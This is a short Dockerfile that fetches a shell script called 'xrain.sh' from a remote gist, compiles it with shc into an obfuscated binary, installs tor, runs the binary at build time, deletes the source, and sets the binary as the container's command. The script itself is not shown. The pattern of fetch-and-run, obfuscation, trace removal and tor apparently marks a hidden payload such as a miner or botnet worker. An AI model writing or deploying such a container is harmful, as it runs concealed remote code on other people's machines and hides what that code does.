FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/castelenl/13409f3d0f99a36d3ef569b7bba51a42/raw/da0d535dae9f403eaf38dd6bd44e751a32a520be/xrain.sh

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc tor && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
